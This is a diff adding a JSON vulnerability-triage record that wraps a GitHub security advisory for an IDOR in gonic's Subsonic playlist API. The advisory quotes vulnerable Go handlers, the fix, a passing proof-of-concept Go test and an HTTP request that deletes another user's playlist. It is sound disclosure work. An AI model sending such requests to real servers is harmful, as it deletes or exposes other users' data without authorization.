@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/74800891?v=4\", \"events_url\": \"https://api.github.com/users/therawdev/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/therawdev/followers\", \"following_url\": \"https://api.github.com/users/therawdev/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/therawdev/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/therawdev\", \"id\": 74800891, \"login\": \"therawdev\", \"node_id\": \"MDQ6VXNlcjc0ODAwODkx\", \"organizations_url\": \"https://api.github.com/users/therawdev/orgs\", \"received_events_url\": \"https://api.github.com/users/therawdev/received_events\", \"repos_url\": \"https://api.github.com/users/therawdev/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/therawdev/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/therawdev/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/therawdev\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-49338\", \"cvss\": {\"score\": 7.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-285\", \"name\": \"Improper Authorization\"}, {\"cwe_id\": \"CWE-639\", \"name\": \"Authorization Bypass Through User-Controlled Key\"}], \"description\": \"## Summary\\n\\nIn gonic, the Subsonic API endpoints `/rest/deletePlaylist.view` and `/rest/getPlaylist.view` perform no per-resource authorization. Once authenticated as *any* user (admin or not), an attacker can:\\n\\n1. **Delete any playlist owned by any other user** (including admin) by passing its `id`.\\n2. **Read the full contents** (name, comment, song list) of any other user's **private** (non-public) playlist by passing its `id`.\\n\\nThe Subsonic playlist `id` is `base64url(\\\"<userID>/<filename>.m3u\\\")`. Because filenames are user-supplied or time-derived and the `userID` is a small integer, IDs are guessable and frequently exposed (e.g. a previously-public playlist that was later made private still has the same ID).\\n\\nThis breaks the multi-user trust boundary of gonic: a low-privileged user can wipe an administrator's curated playlists, and a user can exfiltrate any private playlist they obtain an ID for.\\n\\n## Status\\n\\nThis was originally disclosed to the maintainer by email and has been **fixed in commit `6dd71e6a3c966867ef8c900d359a7df75789f410`** (`fix(subsonic): enforce playlist ownership on getPlaylist/deletePlaylist`, 2026-05-18). The fix has not yet been included in a tagged release; the latest tagged version `v0.20.1` is still vulnerable. Filing this advisory now that private vulnerability reporting is enabled on the repo, so the issue has a public record once the next release ships.\\n\\n## Vulnerable code (pre-fix, at `v0.20.1` / commit `37090aa7`)\\n\\n**Delete IDOR** — `server/ctrlsubsonic/handlers_playlist.go` lines 177-187:\\n\\n```go\\nfunc (c *Controller) ServeDeletePlaylist(r *http.Request) *spec.Response {\\n    params := r.Context().Value(CtxParams).(params.Params)\\n    playlistID, err := params.GetFirstID(\\\"id\\\", \\\"playlistId\\\")\\n    if err != nil {\\n        return spec.NewError(10, \\\"please provide an `id` or `playlistId` parameter\\\")\\n    }\\n    if err := c.playlistStore.Delete(playlistIDDecode(playlistID)); err != nil {\\n        return spec.NewError(0, \\\"delete playlist: %v\\\", err)\\n    }\\n    return spec.NewResponse()\\n}\\n```\\n\\nThe handler never loads the playlist to check `playlist.UserID == user.ID`. Compare to `ServeUpdatePlaylist` (same file, line 138) which *does* perform this check.\\n\\n**Read IDOR** — `server/ctrlsubsonic/handlers_playlist.go` lines 51-68:\\n\\n```go\\nfunc (c *Controller) ServeGetPlaylist(r *http.Request) *spec.Response {\\n    params := r.Context().Value(CtxParams).(params.Params)\\n    playlistID, err := params.GetFirstID(\\\"id\\\", \\\"playlistId\\\")\\n    if err != nil {\\n        return spec.NewError(10, \\\"please provide an `id` parameter\\\")\\n    }\\n    playlist, err := c.playlistStore.Read(playlistIDDecode(playlistID))\\n    if err != nil {\\n        return spec.NewError(70, \\\"playlist with id %s not found\\\", playlistID)\\n    }\\n    // ... never checks playlist.UserID or playlist.IsPublic ...\\n    sub.Playlist = rendered\\n    return sub\\n}\\n```\\n\\nThe listing endpoint `ServeGetPlaylists` (line 38) correctly filters by `playlist.UserID != user.ID && !playlist.IsPublic`, but the singular `getPlaylist` did not.\\n\\n## Live PoC (passing Go test)\\n\\nA reproducer against the existing test fixture (`server/ctrlsubsonic`):\\n\\n```go\\nfunc TestIDOR_DeleteOtherUsersPlaylist(t *testing.T) {\\n    f := newFixture(t)\\n    victimRelPath := filepath.Join(\\\"1\\\", \\\"victim-private.m3u\\\")\\n    _ = f.contr.playlistStore.Write(victimRelPath, &playlistp.Playlist{\\n        UserID: f.admin.ID, Name: \\\"victim-private\\\", IsPublic: false,\\n        Items: []string{\\\"/music/foo.flac\\\"},\\n    })\\n    victimID := playlistIDEncode(victimRelPath).String()\\n    // f.alt is a non-admin, non-owner user\\n    body := f.query(t, f.contr.ServeDeletePlaylist, f.alt, url.Values{\\\"id\\\": {victimID}})\\n    // Subsonic returns status=\\\"ok\\\" and the file is gone.\\n}\\n```\\n\\nTest output:\\n\\n```\\n--- PASS: TestIDOR_ReadOtherUsersPrivatePlaylist (0.07s)\\n--- PASS: TestIDOR_DeleteOtherUsersPlaylist (0.07s)\\nPASS\\nok  go.senan.xyz/gonic/server/ctrlsubsonic 0.730s\\n```\\n\\n## Equivalent HTTP request\\n\\n```\\nGET /rest/deletePlaylist.view?u=lowpriv&p=lowpriv&v=1&c=poc&f=json&id=cGwtMS1zaGFyZWQubTN1\\n```\\n\\nResponse: `{\\\"subsonic-response\\\":{\\\"status\\\":\\\"ok\\\",\\\"version\\\":\\\"...\\\"}}` — playlist is gone.\\n\\n## Impact\\n\\n- **Integrity / Availability**: low-privileged users can delete any other user's playlists, including admin's curated lists. There is no undo.\\n- **Confidentiality**: private playlists (including their comment fields) are readable by any authenticated user with an ID. IDs are predictable (`base64(\\\"<smallUserID>/<name>.m3u\\\")`) and previously-public IDs persist after being marked private.\\n- **Trust boundary**: gonic supports multiple users (`createUser`, non-admin role). This bug collapsed the user-to-user authorization model.\\n\\n## Affected versions\\n\\nLatest tagged release `v0.20.1` and all prior versions back to when the playlist M3U store was introduced. Master HEAD is fixed at commit `6dd71e6a3c966867ef8c900d359a7df75789f410`.\\n\\n## Suggested patch (applied by maintainer in `6dd71e6`)\\n\\nLoad the playlist first and enforce ownership in both handlers:\\n\\n```go\\n// ServeGetPlaylist\\nif playlist.UserID != user.ID && !playlist.IsPublic {\\n    return spec.NewError(50, \\\"you aren't allowed to read that user's playlist\\\")\\n}\\n\\n// ServeDeletePlaylist\\nif playlist.UserID != 0 && playlist.UserID != user.ID {\\n    return spec.NewError(50, \\\"you aren't allowed to delete that user's playlist\\\")\\n}\\n```\\n\\nThis mirrors the existing ownership check already present in `ServeCreateOrUpdatePlaylist` (line 84) and `ServeUpdatePlaylist` (line 138).\\n\\n## Credits\\n\\nReported by Vishal Shukla ([@shukla304](https://github.com/shukla304) / [@therawdev](https://github.com/therawdev)).\", \"epss\": {\"percentage\": 0.00168, \"percentile\": 0.06373}, \"ghsa_id\": \"GHSA-hmgp-w9jm-vp95\", \"github_reviewed_at\": \"2026-06-26T23:33:24Z\", \"html_url\": \"https://github.com/advisories/GHSA-hmgp-w9jm-vp95\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hmgp-w9jm-vp95\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-49338\"}], \"nvd_published_at\": \"2026-06-19T19:16:36Z\", \"published_at\": \"2026-06-26T23:33:24Z\", \"references\": [\"https://github.com/sentriz/gonic/security/advisories/GHSA-hmgp-w9jm-vp95\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-49338\", \"https://github.com/sentriz/gonic/commit/6dd71e6\", \"https://github.com/advisories/GHSA-hmgp-w9jm-vp95\"], \"repository_advisory_url\": \"https://api.github.com/repos/sentriz/gonic/security-advisories/GHSA-hmgp-w9jm-vp95\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/sentriz/gonic\", \"summary\": \"Subsonic API: any authenticated user can delete or read any other user's playlist (IDOR)\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-26T23:33:26Z\", \"url\": \"https://api.github.com/advisories/GHSA-hmgp-w9jm-vp95\", \"vulnerabilities\": [{\"first_patched_version\": \"0.21.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"go.senan.xyz/gonic\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.20.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hmgp-w9jm-vp95",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "go.senan.xyz/gonic: <= 0.20.1"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-49338"
+    ],
+    "cvss_score": 7.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "go.senan.xyz/gonic"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:56.837839Z",
+  "provenance": {
+    "content_sha256": "0e087d06566b6ff7496532de3754e8b90fcf8962024394f44e14c828c97b7997",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-26T23:33:24Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hmgp-w9jm-vp95",
+  "status": "active",
+  "title": "Subsonic API: any authenticated user can delete or read any other user's playlist (IDOR)",
+  "updated_at": "2026-06-26T23:33:26Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hmgp-w9jm-vp95"
+}
